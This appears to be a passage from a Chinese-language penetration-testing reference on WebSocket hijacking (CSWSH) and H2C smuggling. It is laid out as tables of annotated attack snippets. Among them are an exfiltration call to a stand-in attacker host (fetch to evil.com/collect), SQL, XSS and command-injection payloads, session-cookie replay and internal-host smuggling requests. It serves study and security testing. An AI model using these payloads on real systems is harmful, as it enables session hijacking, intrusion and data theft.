...
---
### 1. WebSocket跨站劫持(CSWSH)

- **id:** `ws-hijack`
- **分类:** WebSocket安全 / WebSocket劫持
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `wss://` | WebSocket Secure协议前缀 | keyword |
| `websocat` | WebSocket命令行客户端工具 | command |
| `Origin: https://evil.com` | 测试跨站Origin是否被接受 | header |
| `Sec-WebSocket-Key` | WebSocket握手必需的随机密钥 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `new WebSocket("wss://{TARGET}/ws")` | 浏览器自动附加目标站点的Cookie | function |
| `ws.onmessage` | 接收WebSocket消息——窃取实时数据 | keyword |
| `fetch("https://evil.com/collect")` | 将窃取的数据外带到攻击者服务器 | function |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION SELECT username,password` | SQL联合注入提取凭据 | technique |
| `<img src=x onerror=...>` | XSS payload——通过聊天消息注入 | technique |
| `127.0.0.1;id` | 命令注入——分号拼接系统命令 | technique |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `websockets.connect` | Python WebSocket客户端库 | function |
| `extra_headers` | 附加Cookie/Token认证头 | parameter |
| `ws.recv()` | 异步接收WebSocket消息 | function |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `sandbox="allow-scripts"` | 沙箱iframe导致Origin为null | technique |
| `Sec-WebSocket-Protocol` | WebSocket子协议协商头 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `Upgrade: websocket` | WebSocket协议升级请求 | header |
| `Upgrade: h2c` | HTTP/2明文协议升级(H2C走私) | header |
| `HTTP2-Settings` | H2C协议升级的必需参数 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `Sec-WebSocket-Key` | WebSocket握手密钥(Base64编码) | header |
| `101` | HTTP 101 Switching Protocols——升级成功 | value |
| `Host: 127.0.0.1` | 走私请求指向内网地址 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `h2cSmuggler.py` | H2C走私专用工具 | command |
| `-x` | 指定代理/目标地址 | parameter |
| `127.0.0.1:8080` | 通过走私访问的内网服务 | domain |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `/..;/admin/` | 路径穿越——利用代理和后端解析差异 | path |
| `X-Forwarded-Host` | 请求头注入——可能导致缓存投毒 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `permessage-deflate` | WebSocket消息压缩扩展——混淆payload | keyword |
| `Transfer-Encoding: chunked` | 分块传输编码隐藏走私内容 | header |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `window.WebSocket = function` | Monkey-patch WebSocket构造函数 | function |
| `ws.send = function` | 拦截发送的消息用于分析 | function |
| `addEventListener("message")` | 监听接收到的消息 | function |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `Authorization: Bearer` | WebSocket握手时的JWT认证 | header |
| `{OTHER_USER_SESSION}` | 测试他人会话Cookie是否可重放 | variable |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `user.1002.notifications` | 其他用户的私有频道——测试越权 | value |
| `admin.dashboard` | 管理员频道——测试垂直越权 | value |
| `public.*` | 通配符订阅——尝试批量接收消息 | technique |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `range(1000)` | 快速发送1000条消息测试速率限制 | value |
| `"A" * (1024 * 1024)` | 1MB大消息测试大小限制 | value |
...
| 片段 | 说明 | 类型 |
|---|---|---|
| `ws://` | 非加密WebSocket——可能绕过TLS层的安全检查 | keyword |
| `transport=polling` | Socket.io HTTP长轮询降级 | parameter |
